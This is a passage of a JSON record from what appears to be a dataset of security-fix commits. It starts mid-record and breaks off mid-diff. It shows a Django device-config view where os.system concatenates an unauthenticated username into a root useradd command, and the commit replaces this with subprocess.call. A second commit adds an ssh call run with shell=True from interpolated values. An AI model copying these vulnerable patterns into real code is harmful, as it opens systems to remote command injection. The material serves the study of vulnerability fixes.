RegisteredServices\n from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n \n-import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n+import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd\n \n # fetch network AP details\n nm = NetworkManager.NetworkManager\n", "add": 1, "remove": 1, "filename": "/vuedj/configtitania/views.py", "badparts": ["import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd "], "goodparts": ["import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd"]}, {"diff": "\n \n def add_user(username, password):\n     encPass = crypt.crypt(password,\"22\")\n-    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n+    #subprocess escapes the username stopping code injection\n+    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])\n \n def add_newWifiConn(wifiname, wifipass):\n     print(wlans)\n", "add": 2, "remove": 1, "filename": "/vuedj/configtitania/views.py", "badparts": ["    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)"], "goodparts": ["    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])"]}], "source": "\nfrom django.shortcuts import render from django.http import HttpResponse, JsonResponse from django.views.decorators.csrf import csrf_exempt from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser from rest_framework.response import Response from rest_framework import viewsets from rest_framework.decorators import list_route from flask import escape from.models import BoxDetails, RegisteredServices from.serializers import BoxDetailsSerializer, RegisteredServicesSerializer import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd nm=NetworkManager.NetworkManager wlans=[d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)] def get_osversion(): \"\"\" PRETTY_NAME of your Titania os(in lowercase). \"\"\" with open(\"/etc/os-release\") as f: osfilecontent=f.read().split(\"\\n\") version=osfilecontent[4].split('=')[1].strip('\\\"') return version def get_allconfiguredwifi(): \"\"\" nmcli con | grep 802-11-wireless \"\"\" ps=subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\n') wifi=[] for row in wifirows: name=row.split(':') print(name) wifi.append(name[0]) return wifi def get_allAPs(): \"\"\" nmcli con | grep 802-11-wireless \"\"\" ps=subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\n') wifi=[] for row in wifirows: entry=row.split(':') print(entry) wifi.append(entry) return wifi def add_user(username, password): encPass=crypt.crypt(password,\"22\") os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username) def add_newWifiConn(wifiname, wifipass): print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap print(currentwifi) params={ \"802-11-wireless\":{ \"security\": \"802-11-wireless-security\", }, \"802-11-wireless-security\":{ \"key-mgmt\": \"wpa-psk\", \"psk\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) def delete_WifiConn(wifiap): \"\"\" nmcli connection delete id <connection name> \"\"\" ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE) print(ps) def edit_WifiConn(wifiname, wifipass): ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE) print(ps) print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap params={ \"802-11-wireless\":{ \"security\": \"802-11-wireless-security\", }, \"802-11-wireless-security\":{ \"key-mgmt\": \"wpa-psk\", \"psk\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) return @csrf_exempt def handle_config(request): \"\"\" List all code snippets, or create a new snippet. \"\"\" if request.method=='POST': action=request.POST.get(\"_action\") print(action) if action=='registerService': request_name=request.POST.get(\"name\") request_address=request.POST.get(\"address\") request_icon=request.POST.get(\"icon\") print(request_name) print(request_address) print(request_icon) setServiceDetails=RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon) return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False) elif action=='getSchema': schema=get_osversion() return JsonResponse({\"version_info\":schema}, safe=False) elif action=='getIfConfigured': print(action) queryset=BoxDetails.objects.all() serializer=BoxDetailsSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='loadDependencies': print(action) queryset=RegisteredServices.objects.all() serializer=RegisteredServicesSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='getAllAPs': wifi_aps=get_allAPs() return JsonResponse(wifi_aps, safe=False) elif action=='saveUserDetails': print(action) boxname=escape(request.POST.get(\"boxname\")) username=escape(request.POST.get(\"username\")) password=escape(request.POST.get(\"password\")) print(username) add_user(username,password) setBoxName=BoxDetails(boxname=boxname) setBoxName.save() wifi_pass=request.POST.get(\"wifi_password\") wifi_name=request.POST.get(\"wifi_ap\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False) elif action=='login': print(action) username=escape(request.POST.get(\"username\")) password=escape(request.POST.get(\"password\")) output='' \"\"\"Tries to authenticate a user. Returns True if the authentication succeeds, else the reason (string) is returned.\"\"\" try: enc_pwd=spwd.getspnam(username)[1] if enc_pwd in[\"NP\", \"!\", \"\", None]: output=\"User '%s' has no password set\" % username if enc_pwd in[\"LK\", \"*\"]: output=\"account is locked\" if enc_pwd==\"!!\": output=\"password has expired\" if crypt.crypt(password, enc_pwd)==enc_pwd: output='' else: output=\"incorrect password\" except KeyError: output=\"User '%s' not found\" % username if len(output)==0: return JsonResponse({\"username\":username}, safe=False) else: return JsonResponse(output, safe=False) elif action=='logout': print(action) username=request.POST.get(\"username\") print(username+' ') queryset=User.objects.all().first() if username==queryset.username: return JsonResponse({\"STATUS\":\"SUCCESS\", \"username\":queryset.username}, safe=False) elif action=='getDashboardCards': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_DASHBOARD_CARDS) rows=cursor.fetchall() print(rows) return JsonResponse(rows, safe=False) elif action=='getDashboardChart': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],]) datasets=cursor.fetchall() print(datasets) data={'container_name': row[1], 'data': datasets} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getDockerOverview': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_DOCKER_OVERVIEW) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: data={'state': row[0], 'container_id': row[1], 'name': row[2], 'image': row[3], 'running_for': row[4], 'command': row[5], 'ports': row[6], 'status': row[7], 'networks': row[8]} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getContainerStats': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] datasets_io=[] datasets_mem=[] datasets_perc=[] for row in rows: datasets_io=[] datasets_mem=[] datasets_perc=[] for iter in range(0,2): cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_perc.append(counter_val) for iter in range(2,4): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_mem.append(counter_val) for iter in range(4,8): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_io.append(counter_val) data={'container_id': row[0], 'container_name': row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getThreads': print(action) rows=[] ps=subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\n') nfields=len(processes[0].split()) -1 for row in processes[4:]: rows.append(row.split(None, nfields)) return JsonResponse(rows, safe=False) elif action=='getContainerTop': print(action) con=sqlite3.connect(\"dashboard.sqlite3\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() resultset=[] for i in rows: data={} datasets=[] ps=subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\n') nfields=len(processes[0].split()) -1 for p in processes[1:]: datasets.append(p.split(None, nfields)) data={'container_id': i[0], 'container_name': i[1], 'data': datasets} resultset.append(data) return JsonResponse(resultset, safe=False) elif action=='getSettings': print(action) ps=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=ps.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False) elif action=='deleteUser': print(action) username=escape(request.POST.get(\"user\")) ps=subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate() fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False) elif action=='addNewUser': print(action) username=escape(request.POST.get(\"username\")) password=escape(request.POST.get(\"password\")) add_user(username,password) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False) elif action=='addWifi': print(action) wifi_pass=escape(request.POST.get(\"wifi_password\")) wifi_name=request.POST.get(\"wifi_ap\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False) elif action=='deleteWifi': print(action) wifi_name=request.POST.get(\"wifi\") delete_WifiConn(wifi_name) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False) elif action=='editWifi': print(action) wifi_name=request.POST.get(\"wifi_ap\") wifi_pass=escape(request.POST.get(\"wifi_password\")) edit_WifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False) return JsonResponse(serializer.errors, status=400) def index(request): return render(request, 'index.html') class BoxDetailsViewSet(viewsets.ModelViewSet): queryset=BoxDetails.objects.all() serializer_class=BoxDetailsSerializer class RegisteredServicesViewSet(viewsets.ModelViewSet): queryset=RegisteredServices.objects.all() serializer_class=RegisteredServicesSerializer ", "sourceWithComments": "from django.shortcuts import render\nfrom django.http import HttpResponse, JsonResponse\nfrom django.views.decorators.csrf import csrf_exempt\n\nfrom rest_framework.renderers import JSONRenderer\nfrom rest_framework.parsers import JSONParser\nfrom rest_framework.response import Response\nfrom rest_framework import viewsets\nfrom rest_framework.decorators import list_route\nfrom flask import escape\n\nfrom .models import BoxDetails, RegisteredServices\nfrom .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n\nimport common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n\n# fetch network AP details\nnm = NetworkManager.NetworkManager\nwlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]\n\ndef get_osversion():\n    \"\"\"\n    PRETTY_NAME of your Titania os (in lowercase).\n    \"\"\"\n    with open(\"/etc/os-release\") as f:\n        osfilecontent = f.read().split(\"\\n\")\n        # $PRETTY_NAME is at the 5th position\n        version = osfilecontent[4].split('=')[1].strip('\\\"')\n        return version\n\ndef get_allconfiguredwifi():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        name = row.split(':')\n        print(name)\n        wifi.append(name[0])\n    return wifi\n\ndef get_allAPs():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        entry = row.split(':')\n        print(entry)\n        wifi.append(entry)\n    return wifi\n    # wifi_aps = []   \n    # for dev in wlans:\n    #     for ap in dev.AccessPoints:\n    #         wifi_aps.append(ap.Ssid)\n    # return wifi_aps\n\ndef add_user(username, password):\n    encPass = crypt.crypt(password,\"22\")\n    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n\ndef add_newWifiConn(wifiname, wifipass):\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    print(currentwifi)\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        \n\ndef delete_WifiConn(wifiap):\n    \"\"\"\n    nmcli connection delete id <connection name>\n    \"\"\"\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)\n    print(ps)\n\ndef edit_WifiConn(wifiname, wifipass):\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)\n    print(ps)\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) \n    return       \n\n@csrf_exempt\ndef handle_config(request):\n    \"\"\"\n    List all code snippets, or create a new snippet.\n    \"\"\" \n    if request.method == 'POST':\n        action = request.POST.get(\"_action\")\n        print(action)\n        if action == 'registerService':\n            request_name = request.POST.get(\"name\")\n            request_address = request.POST.get(\"address\")\n            request_icon = request.POST.get(\"icon\")\n            print(request_name)\n            print(request_address)\n            print(request_icon)\n            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'getSchema':\n            schema = get_osversion()\n            return JsonResponse({\"version_info\":schema}, safe=False)\n        elif action == 'getIfConfigured':\n            print(action)\n            queryset = BoxDetails.objects.all()\n            serializer = BoxDetailsSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'loadDependencies':\n            print(action)\n            queryset = RegisteredServices.objects.all()\n            serializer = RegisteredServicesSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'getAllAPs':\n            wifi_aps = get_allAPs()\n            return JsonResponse(wifi_aps, safe=False)\n        elif action == 'saveUserDetails':\n            print(action)\n            boxname = escape(request.POST.get(\"boxname\"))\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            print(username)\n            add_user(username,password)\n            setBoxName = BoxDetails(boxname=boxname)\n            setBoxName.save()\n            # connect to wifi ap user selected\n            wifi_pass = request.POST.get(\"wifi_password\")\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'login':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            output=''\n            \"\"\"Tries to authenticate a user.\n            Returns True if the authentication succeeds, else the reason\n            (string) is returned.\"\"\"\n            try:\n                enc_pwd = spwd.getspnam(username)[1]\n                if enc_pwd in [\"NP\", \"!\", \"\", None]:\n                    output = \"User '%s' has no password set\" % username\n                if enc_pwd in [\"LK\", \"*\"]:\n                    output = \"account is locked\"\n                if enc_pwd == \"!!\":\n                    output = \"password has expired\"\n                # Encryption happens here, the hash is stripped from the\n                # enc_pwd and the algorithm id and salt are used to encrypt\n                # the password.\n                if crypt.crypt(password, enc_pwd) == enc_pwd:\n                    output = ''\n                else:\n                    output = \"incorrect password\"\n            except KeyError:\n                output = \"User '%s' not found\" % username\n            if len(output) == 0:\n                return JsonResponse({\"username\":username}, safe=False)\n            else:\n                return JsonResponse(output, safe=False)\n        elif action == 'logout':\n            print(action)\n            username = request.POST.get(\"username\")\n            print(username+' ')\n            queryset = User.objects.all().first()\n            if username == queryset.username:\n                return JsonResponse({\"STATUS\":\"SUCCESS\", \"username\":queryset.username}, safe=False)\n        elif action == 'getDashboardCards':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_DASHBOARD_CARDS)\n            rows = cursor.fetchall()\n            print(rows)\n            return JsonResponse(rows, safe=False)\n        elif action == 'getDashboardChart':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])\n                datasets = cursor.fetchall()\n                print(datasets)\n                data = {'container_name' : row[1], 'data': datasets}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getDockerOverview':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                data = {'state': row[0], 'container_id': row[1], 'name': row[2],\n                        'image': row[3], 'running_for': row[4],\n                        'command': row[5], 'ports': row[6],\n                        'status': row[7], 'networks': row[8]}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getContainerStats':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            datasets_io = []\n            datasets_mem = []\n            datasets_perc = []\n            for row in rows:\n                datasets_io = []\n                datasets_mem = []\n                datasets_perc = []\n                # values with % appended to them\n                for iter in range(0,2):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_perc.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(2,4):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_mem.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(4,8):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_io.append(counter_val)\n                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getThreads':\n            print(action)\n            rows = []\n            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]\n            processes = ps.decode().split('\\n')\n            # this specifies the number of splits, so the splitted lines\n            # will have (nfields+1) elements\n            nfields = len(processes[0].split()) - 1\n            for row in processes[4:]:\n                rows.append(row.split(None, nfields))\n            return JsonResponse(rows, safe=False)\n        elif action == 'getContainerTop':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            resultset = []\n            for i in rows:\n                data = {}\n                datasets = []\n                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]\n                processes = ps.decode().split('\\n')\n                # this specifies the number of splits, so the splitted lines\n                # will have (nfields+1) elements\n                nfields = len(processes[0].split()) - 1\n                for p in processes[1:]:\n                    datasets.append(p.split(None, nfields))\n                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}\n                resultset.append(data)\n            return JsonResponse(resultset, safe=False)\n        elif action == 'getSettings':\n            print(action)\n            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = ps.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)\n        elif action == 'deleteUser':\n            print(action)\n            username = escape(request.POST.get(\"user\"))\n            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)\n        elif action == 'addNewUser':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            add_user(username,password)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)\n        elif action == 'addWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'deleteWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi\")\n            delete_WifiConn(wifi_name)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'editWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi_ap\")\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            edit_WifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)\n        return JsonResponse(serializer.errors, status=400)\n\ndef index(request):\n    return render(request, 'index.html')\n\nclass BoxDetailsViewSet(viewsets.ModelViewSet):\n    queryset = BoxDetails.objects.all()\n    serializer_class = BoxDetailsSerializer\n\nclass RegisteredServicesViewSet(viewsets.ModelViewSet):\n    queryset = RegisteredServices.objects.all()\n    serializer_class = RegisteredServicesSerializer    \n\n\n"}}, "msg": "#21 Unauthenticated remote root code execution\n\nChanged from os.system to subprocess that escapes username automatically"}}, "https://github.com/DavidPL1/Hyperion": {"269b8c87afc149911af3ae63b3ccbfc77ffb223d": {"url": "https://api.github.com/repos/DavidPL1/Hyperion/commits/269b8c87afc149911af3ae63b3ccbfc77ffb223d", "html_url": "https://github.com/DavidPL1/Hyperion/commit/269b8c87afc149911af3ae63b3ccbfc77ffb223d", "sha": "269b8c87afc149911af3ae63b3ccbfc77ffb223d", "keyword": "remote code execution check", "diff": "diff --git a/hyperion/hyperion.py b/hyperion/hyperion.py\nindex 804d071..22fe953 100644\n--- a/hyperion/hyperion.py\n+++ b/hyperion/hyperion.py\n@@ -244,7 +244,13 @@ def start_remote_component(self, comp_name, host):\n     # Check\n     ###################\n     def check_component(self, comp):\n-        return check_component(comp, self.session, self.logger)\n+        if self.run_on_localhost(comp):\n+            return check_component(comp, self.session, self.logger)\n+        else:\n+            self.logger.debug(\"Starting remote check\")\n+            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])\n+            ret = call(cmd, shell=True)\n+            return CheckState(ret)\n \n     ###################\n     # Dependency management\n@@ -428,9 +434,9 @@ def check_component(comp, session, logger):\n         pids = [p.pid for p in procs]\n         logger.debug(\"Window is running %s child processes\" % len(pids))\n \n-        # Two processes are tee logging\n+        # TODO: Investigate minimum process number on hosts\n         # TODO: Change this when more logging options are introduced\n-        if len(pids) < 3:\n+        if len(pids) < 2:\n             logger.debug(\"Main window process has finished. Running custom check if available\")\n             if check_available and run_component_check(comp):\n                 logger.debug(\"Process terminated but check was successful\")\n@@ -493,7 +499,6 @@ def send_main_session_command(session, cmd):\n     window = find_window(session, \"Main\")\n     window.cmd(\"send-keys\", cmd, \"Enter\")\n \n-\n ###################\n # Logging\n ###################\n", "message": "", "files": {"/hyperion/hyperion.py": {"changes": [{"diff": "\n     # Check\n     ###################\n     def check_component(self, comp):\n-        return check_component(comp, self.session, self.logger)\n+        if self.run_on_localhost(comp):\n+            return check_component(comp, self.session, self.logger)\n+        else:\n+            self.logger.debug(\"Starting remote check\")\n+            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])\n+            ret = call(cmd, shell=True)\n+            return CheckState(ret)\n \n     ###################\n     # Dependency management\n", "add": 7, "remove": 1, "filename": "/hyperion/hyperion.py", "badparts": ["        return check_component(comp, self.session, self.logger)"], "goodparts": ["        if self.run_on_localhost(comp):", "            return check_component(comp, self.session, self.logger)", "        else:", "            self.logger.debug(\"Starting remote check\")", "            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])", "            ret = call(cmd, shell=True)", "            return CheckState(ret)"]}, {"diff": "\n         pids = [p.pid for p in procs]\n         logger.debug(\"Window is running %s child processes\" % len(pids))\n \n-        # 